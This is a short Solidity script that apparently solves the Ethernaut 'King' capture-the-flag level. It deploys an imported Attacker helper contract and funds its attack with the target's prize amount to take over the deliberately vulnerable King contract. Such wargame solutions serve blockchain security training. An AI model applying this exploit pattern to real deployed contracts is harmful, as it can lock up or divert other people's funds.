// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {King} from "ethernaut/levels/King.sol";
import {Attacker} from "~/helpers/King.sol";

contract Check is CheckScript("KING") {}

contract Solve is SolveScript("KING") {
    King target;

    constructor() {
        target = King(instance);
    }

    function attack() public override {
        Attacker attacker = new Attacker(address(target));
        attacker.attack{value: target.prize()}();
    }
}
